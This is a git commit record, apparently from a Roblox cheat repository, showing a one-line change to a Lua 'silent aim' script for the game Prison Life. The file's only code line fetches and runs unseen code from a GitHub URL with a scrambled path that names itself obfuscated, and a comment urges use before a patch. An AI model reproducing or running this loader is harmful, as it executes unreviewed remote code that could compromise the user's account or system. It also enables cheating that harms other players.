7c616f477c6e9481c847c15bf2ffc4431bef9709
Freezesploit <probuunny223@gmail.com>
2025-10-30 02:25:47 -0700

    Update silentaimprisonlife.lua

--- silentaimprisonlife.lua
+++ silentaimprisonlife.lua
@@ -1,3 +1,3 @@
 -- This might get patched soon so use as fast as you can.
-
+-- Btw credits to gonnered, i didnt make this
 loadstring(game:HttpGet("https://raw.githubusercontent.com/gonnered/aHehshjzJsizkKksdbbIsisiobfuvated/refs/heads/main/POLAND"))()
